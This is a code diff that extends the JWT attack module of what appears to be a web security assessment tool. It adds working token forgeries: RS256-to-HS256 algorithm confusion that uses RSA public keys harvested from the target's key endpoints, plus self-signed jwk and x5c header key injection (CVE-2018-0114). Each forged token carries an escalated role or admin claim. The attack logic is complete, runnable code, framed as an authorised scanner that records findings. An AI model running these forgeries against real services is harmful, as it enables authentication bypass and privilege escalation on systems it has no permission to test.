@@ -14,9 +14,15 @@ endpoint ignores auth:
                           PUBLIC key (fetched from a JWKS/cert endpoint) as the HMAC secret; a
                           server that treats the key by name alone will accept it.
 
+  * jwk / x5c header     — self-signed key injection (CVE-2018-0114): forge an RSA keypair, embed
+                          its public JWK (or a self-signed x5c cert chain) in the token header and
+                          sign RS256 with the matching private key; a server that trusts the key
+                          carried in the header accepts it.
+
 Each forgery also TAMPERS a claim (role/admin/user) so a hit proves identity forgery, not just a
-replay. No third-party crypto: alg:none and HMAC need only base64/hmac/hashlib. jku/x5u/jwk/x5c
-(attacker-supplied RSA keys) are out of scope here — they need an RSA library.
+replay. alg:none and HMAC use only base64/hmac/hashlib; RS->HS confusion, jwk and x5c need RSA
+signing and JWK->PEM, which come from `cryptography`. jku/x5u (fetch an attacker-HOSTED JWKS) are
+not forged here because confirming them needs an attacker endpoint the target can reach back to.
 """
 
 from __future__ import annotations
@@ -233,6 +239,134 @@ def _crack_hmac(token, extra):
     return None, None
 
 
+def _rsa():
+    """Lazy cryptography import so a scan never crashes if the optional lib is absent."""
+    try:
+        from cryptography.hazmat.primitives import hashes, serialization
+        from cryptography.hazmat.primitives.asymmetric import padding, rsa
+        return hashes, serialization, padding, rsa
+    except Exception:
+        return None
+
+
+def _rs256_sign(header: dict, payload: dict, key) -> str:
+    hashes, _ser, padding, _r = _rsa()
+    si = _b64e(json.dumps(header, separators=(",", ":")).encode()) + "." + \
+        _b64e(json.dumps(payload, separators=(",", ":")).encode())
+    sig = key.sign(si.encode(), padding.PKCS1v15(), hashes.SHA256())
+    return si + "." + _b64e(sig)
+
+
+def _pub_jwk(key) -> dict:
+    pn = key.public_key().public_numbers()
+    nb = pn.n.to_bytes((pn.n.bit_length() + 7) // 8, "big")
+    eb = pn.e.to_bytes((pn.e.bit_length() + 7) // 8, "big")
+    return {"kty": "RSA", "kid": "owlforge", "use": "sig", "alg": "RS256",
+            "n": _b64e(nb), "e": _b64e(eb)}
+
+
+def _selfsigned_x5c(key) -> str:
+    """Standard-base64 DER of a self-signed cert for the x5c header (not url-safe b64)."""
+    import datetime
+
+    from cryptography import x509
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.x509.oid import NameOID
+    ser = serialization
+    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "owlforge")])
+    now = datetime.datetime.now(datetime.UTC)
+    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name)
+            .public_key(key.public_key()).serial_number(x509.random_serial_number())
+            .not_valid_before(now - datetime.timedelta(days=1))
+            .not_valid_after(now + datetime.timedelta(days=365))
+            .sign(key, hashes.SHA256()))
+    return base64.b64encode(cert.public_bytes(ser.Encoding.DER)).decode()
+
+
+def _jwk_to_pem(jwk: dict) -> bytes | None:
+    """RSA public JWK {n,e} -> SubjectPublicKeyInfo PEM (the form a server HMAC-confuses on)."""
+    r = _rsa()
+    if not r or jwk.get("kty") != "RSA" or not jwk.get("n") or not jwk.get("e"):
+        return None
+    _h, ser, _pad, rsa = r
+    try:
+        n = int.from_bytes(_b64d(jwk["n"]), "big")
+        e = int.from_bytes(_b64d(jwk["e"]), "big")
+        pub = rsa.RSAPublicNumbers(e, n).public_key()
+        return pub.public_bytes(ser.Encoding.PEM, ser.PublicFormat.SubjectPublicKeyInfo)
+    except Exception:
+        return None
+
+
+def _harvest_pubkeys(sandbox, target) -> list[bytes]:
+    """Collect candidate RSA public-key byte strings (for RS->HS confusion) from well-known key
+    endpoints: raw PEM/certificate bodies, and JWKS entries converted to PEM."""
+    from urllib.parse import urljoin, urlsplit
+    origin = "{0.scheme}://{0.netloc}".format(urlsplit(target))
+    keys: list[bytes] = []
+    seen: set[bytes] = set()
+
+    def add(b: bytes) -> None:
+        for v in (b, b.rstrip() + b"\n", b.rstrip()):   # with/without trailing newline both tried
+            if v and v not in seen:
+                seen.add(v)
+                keys.append(v)
+
+    paths = list(_KEY_PATHS)
+    for path in paths:
+        body = (_req(sandbox, origin + path, None).get("body") or "").strip()
+        if not body:
+            continue
+        if "-----BEGIN" in body:
+            add(body.encode())
+            continue
+        try:
+            doc = json.loads(body)
+        except Exception:
+            continue
+        if isinstance(doc, dict) and doc.get("jwks_uri"):    # openid-configuration -> follow
+            jb = (_req(sandbox, urljoin(origin, doc["jwks_uri"]), None).get("body") or "").strip()
+            try:
+                doc = json.loads(jb)
+            except Exception:
+                doc = {}
+        for jwk in (doc.get("keys") or []) if isinstance(doc, dict) else []:
+            pem = _jwk_to_pem(jwk)
+            if pem:
+                add(pem)
+    return keys[:12]
+
+
+def _rsa_forgeries(header: dict, payload: dict, sandbox, target, log):
+    """Yield (kind, forged_token) for RS-family forgeries: RS->HS confusion using each harvested
+    public key as the HMAC secret, plus self-signed jwk and x5c header injection."""
+    r = _rsa()
+    if not r:
+        return
+    _h, _ser, _pad, rsa = r
+    esc = _escalate(payload)
+    base = {k: v for k, v in header.items() if k.lower() not in ("jwk", "jku", "x5c", "x5u")}
+    # (a) RS256 -> HS256 confusion: sign HS256 with the RSA PUBLIC key bytes as the secret
+    pubkeys = _harvest_pubkeys(sandbox, target)
+    if pubkeys:
+        log(f"jwt-attack: harvested {len(pubkeys)} RSA public-key form(s) for RS->HS confusion")
+    for pk in pubkeys:
+        yield "RS256->HS256 algorithm confusion", _hs(dict(base, alg="HS256"), esc, pk, "sha256")
+    # (b) self-signed key injection: forge a keypair, carry the public key in the header
+    try:
+        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    except Exception:
+        return
+    yield "jwk header injection (self-signed key trusted)", \
+        _rs256_sign(dict(base, alg="RS256", jwk=_pub_jwk(key)), esc, key)
+    try:
+        x5c = _selfsigned_x5c(key)
+        yield "x5c header injection (self-signed cert trusted)", \
+            _rs256_sign(dict(base, alg="RS256", x5c=[x5c]), esc, key)
+    except Exception:
+        pass
+
+
 def _file(assessment_id, url, kind, token, forged, detail, log):
     from owlforge.store.db import session
     from owlforge.store.models import Finding
@@ -291,6 +425,14 @@ def jwt_attack_scan(assessment_id, inventory, sandbox, session_headers=None,
                         _file(assessment_id, oracle["url"], f"weak HMAC secret ('{secret}')",
                               token, fg, f"The HMAC secret was brute-forced ('{secret}').", log)
                         filed += 1
+                if (header.get("alg") or "").upper().startswith(("RS", "PS")):
+                    for kind, forged in _rsa_forgeries(header, payload, sandbox, target, log):
+                        if _accepted(sandbox, oracle["url"], session_headers, token, forged,
+                                     oracle):
+                            _file(assessment_id, oracle["url"], kind, token, forged,
+                                  "An RSA-family forgery was accepted (confusion or header-"
+                                  "carried key).", log)
+                            filed += 1
 
     # token-less flow: any JWT-guarded endpoint that rejects a bad sig but accepts alg:none
     for hit in _synthetic_alg_none(sandbox, inventory, target, hit_urls, log):
